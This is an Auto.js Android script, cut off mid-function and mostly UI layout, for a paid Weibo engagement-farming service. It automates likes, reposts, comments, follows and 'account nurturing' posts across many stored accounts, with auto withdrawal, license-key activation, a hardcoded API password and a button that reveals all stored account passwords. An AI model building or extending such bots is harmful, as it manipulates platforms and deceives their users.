"ui";
try {
  importClass("android.util.Base64");
} catch (e) {}
try {
  importClass("okhttp3.Request");
} catch (e) {}
try {
  importClass("okhttp3.Response");
} catch (error) {}
try {
  importClass("okhttp3.Callback");
} catch (error) {}
try {
  importClass("okhttp3.FormBody");
} catch (e) {}
try {
  importClass("okhttp3.OkHttpClient");
} catch (e) {}

try {
  importClass("okhttp3.WebSocket");
} catch (e) {}
try {
  importClass("okhttp3.WebSocketListener");
} catch (e) {}
try {
  importClass("okio.ByteString");
} catch (e) {}

try {
  importClass("java.lang.StringBuilder");
} catch (e) {}

var DataVersion = "";

var StoragePool = storages.create("QQ1659809758_HuLiHuZhu" + DataVersion);

var ConfigFileFolder = "/storage/emulated/0/代码侠辅助/";
var ConfigFilePath = ConfigFileFolder + "wbcs" + DataVersion + ".ini";
var SettingConfigFilePath =
  ConfigFileFolder + "wbSetting" + DataVersion + ".txt";

var Cfg = LoadSettingConfig();
var SoftwareName = "wbhz";
var DeveloperID = "11719";
var ApiPassword = "847418";

var CDK = Cfg.cdk ? Cfg.cdk : "";
var CDKNeedle = "";
//------------------------------
var TextColor = "black";
var TextSize = "12sp";
var MyColor = "#3d3d3f";

//----
ui.layout(
  <drawer id="drawer">
    <vertical>
      <horizontal h="60" w="*" bg="{{MyColor}}" gravity="center_vertical">
        <img
          id="headImg"
          marginLeft="10"
          src="http://xxxxue.gitee.io/important/Logo/logo128128.png"
          h="44"
          w="44"
          circle="true"
          scaleType="fitXY"
          layout_gravity="center_vertical"
        />
        <vertical w="auto" h="44" marginLeft="10">
          <horizontal h="22" gravity="vertical_center">
            <card
              w="auto"
              h="auto"
              margin="5 3 0 0"
              cardCornerRadius="5dp"
              cardBackgroundColor="#dbbb88"
              cardElevation="5dp"
              gravity="center"
              foreground="?selectableItemBackground"
            >
              <horizontal margin="5 0 5 0">
                <text
                  id="user_id"
                  text="互利互助_代码侠"
                  textColor="{{MyColor}}"
                  textStyle="bold"
                />
              </horizontal>
            </card>
          </horizontal>
          <horizontal>
            <card
              w="auto"
              h="auto"
              margin="5 3 0 0"
              cardCornerRadius="5dp"
              cardBackgroundColor="{{MyColor}}"
              cardElevation="5dp"
              gravity="center"
              foreground="?selectableItemBackground"
            >
              <horizontal margin="5 0 5 0">
                <text textColor="#FFF68F" text="" textSize="{{TextSize}}" />
                <text
                  id="wbsj"
                  textColor="#FFF68F"
                  w="auto"
                  marginRight="10"
                  textSize="{{TextSize}}"
                  text="版本:1.0.8"
                />
              </horizontal>
            </card>
          </horizontal>
        </vertical>

        <horizontal h="44" w="*" gravity="right">
          <card
            w="auto"
            h="auto"
            cardCornerRadius="40dp"
            cardBackgroundColor="#3b3b3b"
            gravity="center"
            foreground="?selectableItemBackground"
          >
            <button
              id="Btn_StartTask"
              text="开始任务"
              textSize="{{TextSize}}"
              w="auto"
              h="auto"
              style="Widget.AppCompat.Button.Colored"
            />
          </card>
          <button
            id="Btn_More"
            text="更多"
            textSize="12sp"
            w="auto"
            h="44"
            style="Widget.AppCompat.Button.Borderless.Colored"
          />
        </horizontal>
      </horizontal>
      <viewpager id="viewpager">
        <frame>
          <vertical gravity="top">
            {/** 第一屏 Start */}
            <vertical id="Frame_TaskPage">
              <ScrollView>
                <list id="UI_TaskList" paddingBottom="50">
                  <card
                    w="auto"
                    h="auto"
                    margin="10 5"
                    cardCornerRadius="20dp"
                    cardElevation="30dp"
                    gravity="center_vertical"
                    marginTop="10"
                  >
                    <card
                      id="_title_bg"
                      w="auto"
                      h="auto"
                      cardCornerRadius="5dp"
                      cardBackgroundColor="#3b3b3b"
                      gravity="center"
                      foreground="?selectableItemBackground"
                      marginLeft="40"
                    >
                      <text
                        text="{{this.weibo_NickName.length>0?this.weibo_NickName:this.weibo_UserName.length>0?this.weibo_UserName:'-----'}}"
                        margin="5 0 5 0"
                        textSize="12"
                        textStyle="bold"
                        textColor="#dbbb88"
                      />
                    </card>

                    <vertical id="_bg_1" padding="18 8" h="auto">
                      <horizontal marginTop="10">
                        <text
                          text="--------------------"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />

                        <checkbox
                          id="run_Switch"
                          text="任务开关 {{this.identifier}}"
                          checked="{{this.run_Switch}}"
                          textSize="{{TextSize}}"
                        />
                        <text
                          text="  --------------------"
                          textColor="#F75000"
                          w="auto"
                          marginRight="10"
                          textSize="{{TextSize}}"
                        />
                      </horizontal>

                      <vertical visibility="{{this.run_Switch?'visible':'gone'}}">
                        <horizontal>
                          <checkbox
                            id="giveGood_Switch"
                            text="点赞"
                            checked="{{this.giveGood_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />

                          <checkbox
                            id="giveGood_Unshielded_Switch"
                            text="点赞不屏蔽"
                            checked="{{this.giveGood_Unshielded_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <text
                            text="{{this.giveGood_Couont}}"
                            textColor="#F75000"
                            w="auto"
                            margin="5 0"
                            textSize="{{TextSize}}"
                          />
                        </horizontal>

                        <horizontal>
                          <checkbox
                            id="forward_Switch"
                            text="转发"
                            checked="{{this.forward_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <checkbox
                            id="forward_Unshielded_Switch"
                            text="转发不屏蔽"
                            checked="{{this.forward_Unshielded_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <text
                            text="{{this.forward_Count}}"
                            textColor="#F75000"
                            w="auto"
                            margin="5 0"
                            textSize="{{TextSize}}"
                          />
                        </horizontal>
                        <horizontal>
                          <checkbox
                            id="specify_Comments_Switch"
                            text="指定评论"
                            checked="{{this.specify_Comments_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <text
                            text="{{this.comment_Count}}"
                            textColor="#F75000"
                            w="auto"
                            margin="5 0"
                            textSize="{{TextSize}}"
                          />
                          <checkbox
                            id="specify_Comments_And_Follow_Switch"
                            text="指评并关注"
                            checked="{{this.specify_Comments_And_Follow_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <text
                            text="{{this.specify_Comments_And_Follow_Count}}"
                            textColor="#F75000"
                            w="auto"
                            margin="5 0"
                            textSize="{{TextSize}}"
                          />
                        </horizontal>
                        <horizontal>
                          <checkbox
                            id="follow_Switch"
                            text="关注"
                            checked="{{this.follow_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <text
                            text="{{this.follow_Count}}"
                            textColor="#F75000"
                            w="auto"
                            margin="5 0"
                            textSize="{{TextSize}}"
                          />
                          <checkbox
                            id="comments_GIF_Switch"
                            text="评论GIF"
                            checked="{{this.comments_GIF_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                            visibility="gone"
                          />
                          <text
                            text="{{this.comments_GIF_Count}}"
                            textColor="#F75000"
                            w="auto"
                            margin="5 0"
                            textSize="{{TextSize}}"
                            visibility="gone"
                          />

                          <text
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                            text="取消: "
                            margin="5 0"
                          />
                          <text
                            text="{{this.cancel_Count}}"
                            textColor="#F75000"
                            w="auto"
                            margin="5 0"
                            textSize="{{TextSize}}"
                          />
                        </horizontal>
                      </vertical>
                      <horizontal>
                        <text
                          text="--------------------"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                        <checkbox
                          id="autoSendBoWen_Switch"
                          text="自动发博文"
                          checked="{{this.autoSendBoWen_Switch}}"
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                        />
                        <text
                          text="  --------------------"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                      </horizontal>

                      <vertical visibility="{{this.autoSendBoWen_Switch?'visible':'gone'}}">
                        <horizontal>
                          <text
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                            text="总数量: "
                          />
                          <input
                            id="autoSendBoWen_Count"
                            textSize="{{TextSize}}"
                            text="{{this.autoSendBoWen_Count}}"
                            hint=""
                            gravity="center"
                          />
                          <text
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                            text="   间隔: "
                          />
                          <input
                            id="autoSendBoWen_Min_Interval"
                            textSize="{{TextSize}}"
                            text="{{this.autoSendBoWen_Min_Interval}}"
                            hint=""
                            gravity="center"
                          />
                          <text
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                            text="~"
                          />
                          <input
                            id="autoSendBoWen_Max_Interval"
                            textSize="{{TextSize}}"
                            text="{{this.autoSendBoWen_Max_Interval}}"
                            hint=""
                            gravity="center"
                          />
                          <text
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                            text="分钟"
                          />
                        </horizontal>
                      </vertical>
                      <horizontal>
                        <text
                          text="--------------------"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                        <text
                          text="      账号信息        "
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                        <text
                          text="  --------------------"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                      </horizontal>

                      <horizontal>
                        <text
                          text="昵称："
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                        />
                        <text
                          text="{{this.weibo_NickName}}"
                          textSize="{{TextSize}}"
                          textColor="#F75000"
                          w="auto"
                          marginRight="10"
                        />
                        <text
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                          text="账号："
                        />
                        <text
                          text="{{this.weibo_UserName}}"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                      </horizontal>
                      <horizontal>
                        <text
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                          text="关注："
                        />
                        <text
                          text="{{this.weibo_FollowCount}}"
                          textSize="{{TextSize}}"
                          textColor="#F75000"
                          w="auto"
                          marginRight="10"
                        />
                        <text
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                          text="粉丝："
                        />
                        <text
                          text="{{this.weibo_FollowersCount}}"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                          marginRight="10"
                        />
                        <text
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                          text="博文数："
                        />
                        <text
                          text="{{this.weibo_StatusesCount}}"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                      </horizontal>
                      <horizontal>
                        <text
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                          text="等级："
                        />
                        <text
                          text="{{this.huli_Level}}"
                          textColor="#F75000"
                          w="auto"
                          marginRight="10"
                          textSize="{{TextSize}}"
                        />
                        <text
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                          text="金额："
                        />
                        <text
                          text="{{this.huli_Gold}}"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                        />
                        <text
                          text="元"
                          textColor="#F75000"
                          w="auto"
                          textSize="{{TextSize}}"
                          marginRight="10"
                        />

                        <text
                          textSize="12sp"
                          textColor="#dbbb88"
                          text=" 保存按钮 "
                          bg="#3b3b3b"
                          textStyle="bold"
                        />
                      </horizontal>

                      <horizontal>
                        <text
                          textSize="{{TextSize}}"
                          textColor="{{TextColor}}"
                          text="提示："
                        />
                        <text
                          text="{{this.message}}"
                          textColor="red"
                          w="*"
                          textSize="{{TextSize}}"
                        />
                      </horizontal>
                    </vertical>

                    <View
                      bg="{{this.run_Switch || autoSendBoWen_Switch ?'#00FF00':'#ff5722'}}"
                      h="*"
                      w="10"
                    />
                  </card>
                </list>
              </ScrollView>
            </vertical>
            {/** 第一屏 end */}
            {/** 第二屏 start */}
            <vertical id="Frame_LoginWeibo" visibility="gone">
              <linear gravity="center" padding="0 0" w="*">
                <vertical w="*">
                  <vertical layout="center">
                    <button
                      id="Btn_AddAccount"
                      text="添加"
                      textSize="{{TextSize}}"
                      w="*"
                      h="60"
                      style="Widget.AppCompat.Button.Colored"
                    ></button>
                    <text
                      textSize="17sp"
                      textColor="red"
                      text="小提示: 点击列表中的子项, 弹出操作列表"
                      gravity="center"
                    />
                    <text
                      textSize="13sp"
                      textColor="red"
                      text="首次登陆请选择 微博 + 互利"
                      gravity="center"
                    />
                    <text
                      textSize="13sp"
                      textColor="red"
                      text="账号下面状态文字变为绿色,即可正常做任务"
                      gravity="center"
                    />
                    {/* 分割线填充 */}
                    <vertical
                      id="fill_line"
                      w="*"
                      h="4"
                      bg="#FF69B4"
                      margin="0 5"
                    ></vertical>
                  </vertical>
                  <ScrollView w="*">
                    <vertical layout="center">
                      <list id="UI_WeiBoList">
                        <vertical w="*">
                          <linear
                            id="script_list"
                            bg="?selectableItemBackground"
                            h="*"
                          >
                            <vertical h="auto" margin="10">
                              <horizontal>
                                <input
                                  id="pname"
                                  text="{{this.weibo_UserName}}"
                                  textColor="{{TextColor}}"
                                  w="auto"
                                  marginRight="10"
                                  hint="-----微博账号-----"
                                  textSize="{{TextSize}}"
                                />
                                <input
                                  id="mm"
                                  text="{{this.weibo_Password}}"
                                  textColor="{{TextColor}}"
                                  w="auto"
                                  password="true"
                                  marginRight="10"
                                  hint="-----密码-----"
                                  textSize="{{TextSize}}"
                                />
                              </horizontal>
                              <horizontal>
                                <text
                                  textSize="{{TextSize}}"
                                  textColor="{{this.huli_LoginState!='平台已授权'?'#FF0000':'#00CD66'}}"
                                  text="{{this.weibo_NickName.length>0?this.weibo_NickName:'暂未获取昵称'}}"
                                />
                              </horizontal>
                              <horizontal>
                                <text
                                  textSize="{{TextSize}}"
                                  textColor="{{this.huli_LoginState!='平台已授权'?'#FF0000':'#00CD66'}}"
                                  text="{{this.huli_LoginState}}"
                                />
                                <text
                                  textSize="{{TextSize}}"
                                  textColor="{{this.huli_LoginState!='平台已授权'?'#FF0000':'#00CD66'}}"
                                  text="_"
                                />
                                <text
                                  textSize="{{TextSize}}"
                                  textColor="{{this.weibo_LoginState!='微博已登录'?'#FF0000':'#00CD66'}}"
                                  text="{{this.weibo_LoginState}}"
                                />
                              </horizontal>
                            </vertical>
                          </linear>
                          {/* 分割线填充 */}
                          <vertical
                            id="fill_line"
                            w="*"
                            h="4"
                            bg="#FF69B4"
                            margin="0 5"
                          ></vertical>
                        </vertical>
                      </list>
                    </vertical>
                  </ScrollView>
                </vertical>
              </linear>
            </vertical>
            {/** 第二屏 end */}
            {/** 第三屏 Start */}
            <vertical id="Frame_Web" visibility="gone">
              <horizontal>
                <vertical w="*">
                  <button
                    id="Btn_StopAll"
                    text="停止网页并返回首页"
                    textColor="white"
                    h="auto"
                    w="*"
                    bg="#FF6A6A"
                    textSize="10sp"
                  />

                  <TextView
                    id="tv1_text"
                    marginLeft="10dp"
                    marginRight="10dp"
                    singleLine="true"
                    ellipsize="marquee"
                    focusable="true"
                    text="    温馨提示：  滑块拖不动的情况,请先按住【拼图底部按钮】, 接着【上滑一点点】, 再【横着】 滑动, 即可滑到对应位置  "
                    textColor="#D65253"
                  />
                </vertical>
              </horizontal>
              <horizontal marginTop="2">
                <webview id="web" />
              </horizontal>
            </vertical>
            {/** 第三屏 end */}
            {/** 第四屏 Start */}
            <vertical id="Frame_Cdk" visibility="gone">
              <linear gravity="center" padding="3 0">
                <vertical>
                  <horizontal gravity="top|center">
                    <vertical padding="8" h="auto" margin="30 30 30 30">
                      <input
                        id="cdk"
                        text="{{Cfg.cdk}}"
                        hint="---在此处输入卡密---"
                        gravity="center"
                      />
                    </vertical>
                  </horizontal>
                  <horizontal gravity="bottom|center">
                    <vertical>
                      <button
                        id="Btn_CdkOk"
                        text="确定"
                        textSize="16sp"
                        h="60"
                        w="150"
                        margin="60 0 60 0"
                        style="Widget.AppCompat.Button.Colored"
                      />
                    </vertical>
                  </horizontal>
                </vertical>
              </linear>
            </vertical>
            {/** 第四屏 end */}
            {/** 第五屏Start */}
            <vertical id="Frame_More" visibility="gone">
              <ScrollView>
                <vertical gravity="bottom">
                  <horizontal>
                    <button
                      id="Btn_More_BackIndexPage"
                      layout_weight="1"
                      text="返回首页"
                      textSize="15sp"
                      w="*"
                      h="60"
                      bg="#FF7256"
                      style="Widget.AppCompat.Button.Colored"
                    />
                  </horizontal>
                  <horizontal>
                    <TextView
                      id="tv2_text"
                      marginLeft="10dp"
                      marginRight="10dp"
                      singleLine="true"
                      ellipsize="marquee"
                      focusable="true"
                      text="    温馨提示：  长按 微博账号 模块,弹出更多账号操作"
                      textColor="#D65253"
                    />
                  </horizontal>
                  <horizontal>
                    <button
                      id="Btn_OpenLogConsole"
                      layout_weight="1"
                      text="打开日志"
                      textSize="{{TextSize}}"
                      w="*"
                      h="60"
                      style="Widget.AppCompat.Button.Colored"
                    />
                  </horizontal>
                  <horizontal>
                    <button
                      id="Btn_ShowAllAccountPwd"
                      layout_weight="1"
                      text="显示所有微博账号密码"
                      textSize="{{TextSize}}"
                      w="*"
                      h="60"
                      style="Widget.AppCompat.Button.Colored"
                    />
                  </horizontal>
                  <horizontal>
                    <button
                      id="Btn_FeedAccount"
                      text="开始养号发博文"
                      textSize="{{TextSize}}"
                      w="*"
                      h="60"
                      style="Widget.AppCompat.Button.Colored"
                    />
                  </horizontal>
                  <horizontal>
                    <vertical></vertical>
                  </horizontal>
                </vertical>
              </ScrollView>
            </vertical>
            {/** 第五屏 end */}
            {/** 第六屏 Start */}
            <vertical id="Frame_Setting" visibility="gone">
              <linear gravity="center" padding="0 0" w="*">
                <vertical w="*">
                  <vertical layout="center">
                    <button
                      id="Btn_SaveSetting"
                      layout_weight="1"
                      text="保存"
                      textSize="15sp"
                      w="*"
                      h="60"
                      bg="#FF7256"
                      style="Widget.AppCompat.Button.Colored"
                    />

                    <text
                      textSize="17sp"
                      textColor="red"
                      text="小提示: 修改完,请点击保存,否则不生效"
                      gravity="center"
                    />
                    {/* 分割线填充 */}
                    <vertical
                      id="fill_line"
                      w="*"
                      h="4"
                      bg="#FF69B4"
                      margin="0 5"
                    ></vertical>
                  </vertical>

                  <ScrollView w="*">
                    <vertical layout="center">
                      <linear gravity="center" padding="0 0" w="*">
                        <vertical>
                          <checkbox
                            id="dirtyWordCheck_Switch"
                            text="评论检查脏字_开关"
                            checked="{{Cfg.dirtyWordCheck_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <text
                            textSize="{{TextSize}}"
                            textColor="red"
                            text="--------------------------------------------"
                          />
                          <horizontal>
                            <text
                              textSize="{{TextSize}}"
                              textColor="{{TextColor}}"
                              text="界面数据刷新间隔: "
                            />
                            <input
                              id="uiRefreshTime_Text"
                              text="{{Cfg.uiRefreshTime_Text||30}}"
                              hint=""
                              gravity="center"
                            />
                            <text
                              textSize="{{TextSize}}"
                              textColor="{{TextColor}}"
                              text="秒"
                            />
                          </horizontal>
                          <text
                            textSize="{{TextSize}}"
                            textColor="red"
                            text="--------------------------------------------"
                          />
                          <checkbox
                            id="qqPushMsg_Switch"
                            text="QQ通知_开关"
                            checked="{{Cfg.qqPushMsg_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />
                          <horizontal>
                            <text
                              textSize="{{TextSize}}"
                              textColor="{{TextColor}}"
                              text="QQ通知_设备昵称: "
                            />
                            <input
                              id="qqPushMsg_DeviceNickName"
                              text="{{Cfg.qqPushMsg_DeviceNickName||'小可爱'}}"
                              hint="--用于区分多台设备--"
                              gravity="center"
                            />
                          </horizontal>

                          <horizontal>
                            <text
                              textSize="{{TextSize}}"
                              textColor="{{TextColor}}"
                              text="QQ通知_自己的QQ号: "
                            />
                            <input
                              id="qqPushMsg_UserNumber"
                              text="{{Cfg.qqPushMsg_UserNumber||''}}"
                              hint="--接收消息的QQ号--"
                              gravity="center"
                            />
                          </horizontal>

                          <text
                            textSize="{{TextSize}}"
                            textColor="red"
                            text="--------------------------------------------"
                          />
                          <checkbox
                            id="autoDrawMoney_Switch"
                            text="自动提现"
                            checked="{{Cfg.autoDrawMoney_Switch}}"
                            textSize="{{TextSize}}"
                            textColor="{{TextColor}}"
                          />

                          <text
                            textSize="{{TextSize}}"
                            textColor="red"
                            text="--------------------------------------------"
                          />

                          <horizontal>
                            <checkbox
                              id="reconnectionSocketLog_Switch"
                              text="显示 长连接日志"
                              checked="{{Cfg.reconnectionSocketLog_Switch}}"
                              textSize="{{TextSize}}"
                              textColor="{{TextColor}}"
                            />
                          </horizontal>

                          <horizontal>
                            <text
                              textSize="{{TextSize}}"
                              textColor="{{TextColor}}"
                              text="长连接_心跳间隔: "
                            />
                            <input
                              id="heartbeatInterval"
                              text="{{Cfg.heartbeatInterval||5}}"
                              hint=""
                              gravity="center"
                            />
                            <text
                              textSize="{{TextSize}}"
                              textColor="{{TextColor}}"
                              text="秒"
                            />
                          </horizontal>
                        </vertical>
                      </linear>
                    </vertical>
                  </ScrollView>
                </vertical>
              </linear>
            </vertical>
            {/** 第六屏 end */}

            {/** 第七屏 Start */}
            <vertical id="Frame_GoldCoinRunningWater" visibility="gone" w="*">
              <button
                id="Btn_More_BackIndexPage2"
                layout_weight="1"
                text="返回首页"
                textSize="15sp"
                w="*"
                h="auto"
                bg="#FF7256"
                style="Widget.AppCompat.Button.Colored"
              />
              <text
                id="GoldCoinRunningWaterTitle"
                text="---"
                textColor="#F75000"
                w="*"
                margin="5 0"
                textSize="15"
                gravity="center"
              />
              <text
                text="序号 / 时间 / 单价 / 账户金额 / 任务类型"
                textColor="#F75000"
                w="*"
                margin="5 0"
                textSize="{{TextSize}}"
                gravity="center"
                marginBottom="15"
              />
              <ScrollView h="auto" w="*">
                <TableLayout
                  layout_width="fill_parent"
                  layout_height="match_parent"
                  stretchColumns="1,2,3,4,5"
                >
                  <list id="UI_GoldCoinRunningWaterList" paddingBottom="50">
                    <TableRow layout_width="wrap_content">
                      <text
                        text="{{this.index}}"
                        textColor="#F75000"
                        w="auto"
                        margin="5 0"
                        textSize="{{TextSize}}"
                      />
                      <text
                        text="{{this.created_at}}"
                        textColor="#F75000"
                        w="auto"
                        margin="5 0"
                        textSize="{{TextSize}}"
                      />
                      <text
                        text="{{this.amount}}"
                        textColor="#F75000"
                        w="auto"
                        margin="5 0"
                        textSize="{{TextSize}}"
                      />

                      <text
                        text="{{this.task_name}}"
                        textColor="#F75000"
                        w="auto"
                        margin="5 0"
                        textSize="{{TextSize}}"
                      />
                    </TableRow>
                  </list>
                </TableLayout>
              </ScrollView>
            </vertical>
            {/** 第七屏 end */}
          </vertical>
          {/** 右下悬浮按钮 */}
          <vertical gravity="bottom|right" marginTop="10">
            <card
              w="auto"
              h="auto"
              cardCornerRadius="20dp"
              cardBackgroundColor="#3b3b3b"
              gravity="center"
              foreground="?selectableItemBackground"
            >
              <vertical>
                <vertical id="UI_More" gravity="top|right" visibility="gone">
                  <button
                    id="Btn_TaskPage"
                    h="auto"
                    w="auto"
                    bg="#FFA500"
                    textColor="#ffffff"
                    textStyle="bold"
                    padding="0 5"
                    text="任务首页"
                  />
                  <button
                    id="Btn_LoginPage"
                    h="auto"
                    w="auto"
                    bg="#FFA500"
                    textColor="#ffffff"
                    textStyle="bold"
                    padding="0 5"
                    text="登陆页面"
                  />
                  <button
                    id="Btn_Web"
                    h="auto"
                    w="auto"
                    bg="#FFA500"
                    textColor="#ffffff"
                    textStyle="bold"
                    padding="0 5"
                    text="Web"
                  />

                  <button
                    id="Btn_Setting"
                    h="auto"
                    w="auto"
                    bg="#FFA500"
                    textColor="#ffffff"
                    textStyle="bold"
                    padding="0 5"
                    text="设置"
                  />
                  <button
                    id="Btn_CDK"
                    h="auto"
                    w="auto"
                    bg="#FFA500"
                    textColor="#ffffff"
                    textStyle="bold"
                    padding="0 5"
                    text="卡密激活"
                  />
                </vertical>

                <vertical gravity="bottom|right">
                  <button
                    id="Btn_ToggleMore"
                    h="auto"
                    w="auto"
                    bg="#3d3d3f"
                    textColor="#dbbb88"
                    textStyle="bold"
                    padding="0 5"
                    text="展开"
                  />
                </vertical>
              </vertical>
            </card>
          </vertical>
        </frame>
      </viewpager>
    </vertical>
  </drawer>
);
//-----------------------

//-----------------------

ui.tv1_text.setSelected(true);
ui.tv2_text.setSelected(true);
//---------------------------

var MySocket = MySocketHelper();

//-----------------------------------------
var Lock = threads.lock();
var AutoDrawMoneyLock = threads.lock();
//--------------------------------------------
//--------------------------------------
var UA1 =
  "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1";

var TimerHelper = Timer();
TimerHelper.timerSign(9999);
TimerHelper.timerSign(9998);
TimerHelper.timerSign(9997);
TimerHelper.timerSign(9996);
TimerHelper.timerSign(9995);
var Sign = "";
/**
 * 保存所有账号信息
 */
var ScriptInfo = [];
var DrawMoneyMobileArr = [];

/**
 * 页面数据初始化
 */
threads.start(function () {
  //读取保存的授权登录信息
  var data = ReadConfig();
  if (data) {
    ScriptInfo = data;
    SaveConfig();
    SaveSetting();
  }
  ui.run(function () {
    ui.UI_WeiBoList.setDataSource(ScriptInfo);
    ui.UI_TaskList.setDataSource(ScriptInfo);
  });
});

/**
 * 保存设置
 */
ui.Btn_SaveSetting.click(SaveSetting);
function SaveSetting() {
  if (ui.Btn_StartTask.getText() == "开始任务") {
    Cfg.dirtyWordCheck_Switch = GetUISwitch("dirtyWordCheck_Switch");
    Cfg.uiRefreshTime_Text = GetUiText("uiRefreshTime_Text");

    Cfg.qqPushMsg_Switch = GetUISwitch("qqPushMsg_Switch");
    Cfg.qqPushMsg_DeviceNickName = GetUiText("qqPushMsg_DeviceNickName");
    Cfg.qqPushMsg_UserNumber = GetUiText("qqPushMsg_UserNumber");

    Cfg.autoDrawMoney_Switch = GetUISwitch("autoDrawMoney_Switch");
    Cfg.reconnectionSocketLog_Switch = GetUISwitch(
      "reconnectionSocketLog_Switch"
    );
    Cfg.heartbeatInterval = GetUiText("heartbeatInterval");

    Cfg.cdk = GetUiText("cdk");
    SaveSettingConfig();
  } else {
    toast("请先停止任务,再修改设置");
  }
}

/**
 * 开始做任务
 */
ui.Btn_StartTask.click(function () {
  threads.start(function () {
    if (ui.Btn_FeedAccount.getText() == "开始养号发博文") {
      if (ui.Btn_StartTask.getText() == "开始任务") {
        // SaveSetting();
        ui.run(() => {
          ui.Btn_StartTask.setText("停止任务");
        });

        device.keepScreenDim(1000 * 3600 * 24 * 30);
        device.vibrate(300);
        DrawMoneyMobileArr = [];
        //赋值 全局变量
        CDK = Cfg.cdk;

        if (CDK == "") {
          alert("卡密为空,请输入卡密再启动");

          ui.run(() => {
            ui.Btn_StartTask.setText("开始任务");
          });

          threads.shutDownAll(); //停止所有线程
          sleep(600000);
          return;
        }
        if (CDKLogin()) {
          UiTime();
          for (var index = 0; index < ScriptInfo.length; index++) {
            DoAutoSendBoWen(index);

            DoHLTask_long(index);

            sleep(500);
          }
        }
      } else {
        ui.run(() => {
          ui.Btn_StartTask.setText("开始任务");
        });
        device.cancelKeepingAwake();
        device.vibrate(100);
        toastLog("微博任务已停止");
        threads.shutDownAll();
        sleep(999999);
      }
    } else {
      toastLog("请先停止【养号发微博】\n再进行其他操作.");
    }
  });
});

/**
 * 养号 按钮
 */
ui.Btn_FeedAccount.click(function () {
  threads.start(function () {
    if (ui.Btn_StartTask.getText() == "开始任务") {
      if (ui.Btn_FeedAccount.getText() == "开始养号发博文") {
        var finishThreadsCount = 0;
        ui.run(function () {
          dialogs
            .select("请选择发送博文的类型", ["单图博文", "九宫格图片博文"])
            .then((i) => {
              switch (i) {
                case 0: //单图博文
                  threads.start(function () {
                    ui.run(() => {
                      ui.Btn_FeedAccount.setText("停止养号发博文");
                    });

                    for (var i = 0; i < ScriptInfo.length; i++) {
                      threads.start(function () {
                        if (ScriptInfo[i].run_Switch) {
                          SendOneImgBoWen(i);
                        }
                        Lock.lock();
                        finishThreadsCount++;
                        Lock.unlock();
                      });
                      sleep(200);
                    }
                    while (true) {
                      toast(
                        "单图完成数量: " +
                          finishThreadsCount +
                          "/" +
                          ScriptInfo.length
                      );
                      if (finishThreadsCount == ScriptInfo.length) {
                        ui.run(() => {
                          ui.Btn_FeedAccount.setText("开始养号发博文");
                        });
                        toastLog("发布单图任务完成....");
                        threads.shutDownAll();
                        sleep(99999);
                      } else {
                        sleep(2000);
                      }
                    }
                  });
                  break;
                case 1: //九图
                  threads.start(function () {
                    ui.run(() => {
                      ui.Btn_FeedAccount.setText("停止养号发博文");
                    });

                    for (var i = 0; i < ScriptInfo.length; i++) {
                      threads.start(function () {
                        if (ScriptInfo[i].run_Switch) {
                          SendNineImgBoWen(i);
                        }
                        Lock.lock();
                        finishThreadsCount++;
                        Lock.unlock();
                      });
                      sleep(200);
                    }
                    while (true) {
                      toast(
                        "九宫格任务完成数量: " +
                          finishThreadsCount +
                          "/" +
                          ScriptInfo.length
                      );
                      if (finishThreadsCount == ScriptInfo.length) {
                        ui.run(() => {
                          ui.Btn_FeedAccount.setText("开始养号发博文");
                        });
                        toastLog("发布九宫格任务完成....");
                        threads.shutDownAll();
                        sleep(99999);
                      } else {
                        sleep(2000);
                      }
                    }
                  });
                  break;
              }
            });
        });
      } else {
        ui.run(() => {
          ui.Btn_FeedAccount.setText("开始养号发博文");
        });
        toastLog("微博养号任务已停止");
        threads.shutDownAll();
        sleep(99999);
      }
    } else {
      toastLog("请先停止【微博任务】\n再进行其他操作");
    }
  });
});

/**
 * 自动发博文
 * @param {*} index
 */
function DoAutoSendBoWen(index) {
  if (ScriptInfo[index].autoSendBoWen_Switch) {
    if (ScriptInfo[index].weibo_LoginState == "微博已登录") {
      threads.start(function () {
        //检查 前置条件
        if (
          ScriptInfo[index].autoSendBoWen_Count > 0 &&
